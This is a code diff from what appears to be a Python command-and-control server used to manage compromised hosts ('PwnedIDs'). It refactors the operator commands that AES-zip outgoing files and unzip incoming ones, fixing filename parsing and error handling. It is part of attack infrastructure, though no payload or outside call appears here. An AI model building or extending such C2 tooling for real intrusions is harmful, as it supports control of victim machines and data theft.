@@ -171,50 +171,49 @@ class C2Handler(BaseHTTPRequestHandler):
                                   f"{Fore.RESET}command to see Available PwnedID's\n")
 
                     elif command.startswith("server zip "):
-                        # Initialize filename to avoid PyCharm Warning
-                        filename = None
+                        # Check if a supplied file exists in outgoing dir
+                        filename = " ".join(command.split()[2:])
 
-                        # Zip Encrypted file that is setting in our outgoing folder
-                        try:
-                            # Check if a supplied file exists in outgoing dir
-                            filename = command.split()[2]
-
-                            if not path.isfile(f"{OUTGOING}/{filename}"):
-                                raise OSError
-
-                            with AESZipFile(f"{OUTGOING}/{filename}.zip", "w",
-                                            compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
-                                zipFile.setpassword(ZIP_PASSWORD)
-                                zipFile.write(f"{OUTGOING}/{filename}", arcname=filename)
-                                print(f"{Fore.LIGHTGREEN_EX}[+]-Server => {OUTGOING}/{filename} is now Zip-Encrypted "
-                                      f"=> {Fore.RESET}{OUTGOING}/{filename}.zip \n")
-
-                        except OSError:
-                            print(f"{Fore.LIGHTRED_EX}\n[-] => Don't Access to {OUTGOING}/{filename}. {Fore.RESET}\n")
-                        except IndexError:
+                        # Check filename is entered
+                        if not filename:
                             print(f"{Fore.LIGHTRED_EX}\n[-] => You must enter a filename located in {OUTGOING} to "
-                                  f"Zip-Encrypt it. {Fore.RESET}\n")
+                              f"Zip-Encrypt it. {Fore.RESET}\n")
+                        else:
+                            try:
+                                if not path.isfile(f"{OUTGOING}/{filename}"):
+                                    raise OSError
+
+                                # Zip Encrypted file that is setting in our outgoing folder
+                                with AESZipFile(f"{OUTGOING}/{filename}.zip", "w",
+                                                compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
+                                    zipFile.setpassword(ZIP_PASSWORD)
+                                    zipFile.write(f"{OUTGOING}/{filename}", arcname=filename)
+                                    print(f"{Fore.LIGHTGREEN_EX}[+]-Server => {OUTGOING}/{filename} is now Zip-Encrypted "
+                                          f"=> {Fore.RESET}{OUTGOING}/{filename}.zip \n")
+                            except OSError:
+                                print(f"{Fore.LIGHTRED_EX}\n[-] => Don't Access to {OUTGOING}/{filename}. {Fore.RESET}\n")
+
 
                     # server unzip command allows us to unzip decrypted zip files in incoming folder on C2 Server
                     elif command.startswith("server unzip"):
-                        # Initialize filename to avoid PyCharm Warning
-                        filename = None
+                        filename = " ".join(command.split()[2:])
 
-                        # Unzip AES Encrypted file that is setting in our storage folder
-                        try:
-                            filename = command.split()[2]
-                            with AESZipFile(f"{INCOMING}/{filename}") as zipFile:
-                                zipFile.setpassword(ZIP_PASSWORD)
-                                zipFile.extractall(INCOMING)
-                                print(f"[+]-Server => {INCOMING}/{filename} is now Unzipped and Decrypted. \n")
-                        except FileNotFoundError:
-                            print(f"{Fore.LIGHTRED_EX}[-]-Server => {filename} was not found in {INCOMING}. \n")
-                        except OSError:
-                            print(
-                                f"{Fore.LIGHTRED_EX}[-]-Server => OS Error when Unzipped-Decrypted {filename} in {INCOMING}.\n")
-                        except IndexError:
-                            print(
-                                f"{Fore.LIGHTRED_EX}[-]-Server => You must enter a filename located in {INCOMING} to Unzip-Decrypt it. \n")
+                        # Check filename is entered
+                        if not filename:
+                            print(f"{Fore.LIGHTRED_EX}\n[-] => You must enter a filename located in {INCOMING} to "
+                              f"Unzip-Decrypt it. {Fore.RESET}\n")
+                        else:
+                            # Unzip AES Encrypted file that is setting in our storage folder
+                            try:
+                                with AESZipFile(f"{INCOMING}/{filename}") as zipFile:
+                                    zipFile.setpassword(ZIP_PASSWORD)
+                                    zipFile.extractall(INCOMING)
+                                    print(f"[+]-Server => {INCOMING}/{filename} is now Unzipped and Decrypted. \n")
+                            except FileNotFoundError:
+                                print(f"{Fore.LIGHTRED_EX}[-]-Server => {filename} was not found in {INCOMING}. \n")
+                            except OSError:
+                                print(
+                                    f"{Fore.LIGHTRED_EX}[-]-Server => OS Error when Unzipped-Decrypted {filename} in {INCOMING}.\n")
 
                     # The 'server list DIRECTORY' allows us to list files in a folder on the C2 Server
                     elif command.startswith("server list"):
